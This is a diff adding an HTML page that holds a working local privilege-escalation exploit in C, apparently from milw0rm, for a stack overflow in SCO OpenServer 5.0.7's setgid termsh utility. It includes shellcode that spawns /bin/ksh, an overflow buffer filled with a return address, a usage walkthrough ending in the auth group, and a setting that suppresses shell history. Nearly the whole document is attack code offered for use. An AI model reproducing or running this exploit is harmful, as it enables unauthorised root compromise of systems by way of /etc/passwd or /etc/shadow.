@@ -1,0 +1,66 @@
+<html>
+<head>
+<title>SCO Openserver 5.0.7 (termsh) Local Privilege Escalation Exploit</title>
+<pre>
+/* SCO Openserver 5.0.7 termsh exploit
+ * ===================================
+ * 'termsh' is a program to view or modify an existing terminal entry on
+ * SCO Openserver. A stack based overflow exists in the handling of command
+ * line arguements, namely the [-o oadir] arguement. It is installed setgid
+ * auth in a default SCO Openserver 5.0.7 install. An attacker may use this
+ * flaw to gain write access to /etc/passwd or /etc/shadow  allowing for
+ * local root compromise.
+ *
+ * Example use.
+ * $ id
+ * uid=200(user) gid=50(group) groups=50(group)
+ * $ uname -a
+ * SCO_SV scosysv 3.2 5.0.7 i386
+ * $ gcc prdelka-vs-SCO-termshx.c -o prdelka-vs-SCO-termshx
+ * $ ./prdelka-vs-SCO-termshx /opt/K/SCO/Unix/5.0.7Hw/usr/lib/sysadm/termsh
+ * [ SCO Openserver 5.0.7 termsh local privilege escalation exploit
+ * $ id
+ * uid=200(user) gid=50(group) egid=21(auth) groups=50(group)
+ *
+ * - prdelka
+ */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+char shellcode[]=&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+                 &quot;\x68\xff\xf8\xff\x3c\x6a\x65\x89&quot;
+                 &quot;\xe6\xf7\x56\x04\xf6\x16\x31\xc0&quot;
+                 &quot;\x50\x68&quot;&quot;/ksh&quot;&quot;\x68&quot;&quot;/bin&quot;&quot;\x89&quot;
+                 &quot;\xe3\x50\x50\x53\xb0\x3b\xff\xd6&quot;;
+
+int main(int argc,char* argv[])
+{
+        char* buffer;
+        char* arg = &quot;-o&quot;;
+        char *env[] = {&quot;HISTORY=/dev/null&quot;,NULL};
+        long eip,ptr;
+        int i;
+        printf(&quot;[ SCO Openserver 5.0.7 termsh local privilege escalation exploit\n&quot;);
+        if(argc &lt; 2)
+        {
+                printf(&quot;[ Error  : [path]\n[ Example: %s /opt/K/SCO/Unix/5.0.7Hw/usr/lib/sysadm/termsh\n&quot;,argv[0]);
+                exit(0);
+        }
+        eip = 0xa2080853;
+        buffer = malloc(7449 + strlen(shellcode));
+        memset(buffer,'\x00',7449 + strlen(shellcode));
+        ptr = (long)buffer + strlen(shellcode);
+        strncpy(buffer,shellcode,strlen(shellcode));
+        for(i = 1;i &lt;= 1862;i++)
+        {
+                memcpy((char*)ptr,(char*)&amp;eip,4);
+                ptr = ptr + 4;
+        }
+        execle(argv[1],argv[1],arg,buffer,NULL,env);
+        exit(0);
+}
+
+// milw0rm.com [2006-01-03]
+</pre>
+</html>
+
